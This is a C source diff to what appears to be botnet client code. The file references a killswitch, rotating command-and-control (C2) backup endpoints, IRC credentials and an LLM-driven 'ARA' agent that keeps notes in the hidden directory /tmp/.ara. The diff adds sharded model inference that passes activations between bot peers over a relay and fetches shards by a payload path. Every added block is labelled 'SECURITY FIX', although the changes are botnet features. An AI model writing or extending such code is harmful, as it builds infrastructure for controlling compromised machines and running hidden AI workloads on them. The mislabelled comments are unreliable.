@@ -16,6 +16,7 @@
 #include "killswitch.h"
 #include "mesh.h"
 #include "ara.h"
+#include "shard.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -148,6 +149,13 @@ static int init_bot(void) {
     memset(&g_bot.ara, 0, sizeof(g_bot.ara));
     snprintf(g_bot.ara_notes_dir, sizeof(g_bot.ara_notes_dir), "%s", "/tmp/.ara");
 
+    /* SECURITY FIX (#402): distributed-inference sharding. Off by
+     * default; only runs when shard_enabled=1 AND shard_url/sha are
+     * set. Activations ride the relay; shards ride the pinned payload
+     * path. */
+    memset(&g_bot.shard, 0, sizeof(g_bot.shard));
+    g_bot.shard.relay_port = RELAY_DEFAULT_PORT;
+
     /* SECURITY FIX (#93): Disposable-infrastructure C2 rotation. Off
      * by default — no backups configured, the chain is the primary
      * endpoint only. Configure c2_backup_1..4 = host:port (contiguous
@@ -207,6 +215,10 @@ static int init_bot(void) {
         log_info("ARA: enabled — llm=%s model=%s gen=%d notes=%d",
                  g_bot.ara.url, g_bot.ara.model[0] ? g_bot.ara.model : "(default)",
                  ara_generation(), ara_note_count());
+
+    /* #402: bind the bot so shard_forward() can reach the relay token
+     * to push activations to the next pipeline peer. */
+    shard_bind_bot(&g_bot);
 
     /* SECURITY FIX (#2): Environment variable fallback for IRC password
      * if not set in config. */
